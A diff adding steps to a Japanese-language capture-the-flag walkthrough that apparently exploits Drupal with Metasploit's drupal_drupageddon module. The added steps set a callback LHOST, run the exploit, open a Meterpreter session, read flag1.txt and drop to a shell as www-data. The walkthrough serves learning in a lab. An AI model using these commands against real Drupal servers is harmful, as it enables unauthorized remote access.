@@ -66,3 +66,22 @@ msfconsole
   ➢LHOSTが127.0.0.1だとExploitの攻撃が成功してもペイロードの接続先がloclhostになってしまい、ターゲット端末そのものになるため変更
 # [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set LHOST 192.168.56.101
 ```
+11.Exploitモジュール実行
+```
+[msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> run
+```
+- MeterpreterプロンプトからMeterpreterに用意されたコマンドが使用可能になる	<br>							
+例） $ls<br>									
+ユーザー権限で閲覧できるようなファイルにもヒントが書かれていることがある
+```
+(Meterpreter 1)(/var/www) > cat flag1.txt
+```
+12.Meterpreterセッションからシェルに切り替え
+```
+(Meterpreter 1)(/var/www) > shell
+```
+```
+id									
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+➢www-dataユーザーであることが分かった
+```
